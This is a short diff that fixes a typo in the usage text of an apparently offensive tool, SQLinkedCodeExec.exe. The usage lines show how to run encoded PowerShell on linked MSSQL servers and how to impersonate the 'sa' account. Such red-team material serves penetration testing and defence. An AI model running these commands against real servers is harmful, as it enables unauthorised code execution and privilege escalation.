@@ -53,7 +53,7 @@ SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /l
 SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true /lnk true\n"
 
 //Execute Code on linked MSSQL server instance (appsrv01) - Link 1"
-SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true  /link1exec tTrue /lnkedt appsrv01 /codexec <powershell - enc...>\n"
+SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true  /link1exec true /lnkedt appsrv01 /codexec <powershell - enc...>\n"
 
 //Impersonate sa account and execute Code on linked MSSQL server instance (appsrv01) - Link 1"
 SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnk true /impersonate true /imp_user sa /imp_db msdb /codexec <powershell - enc>\n"
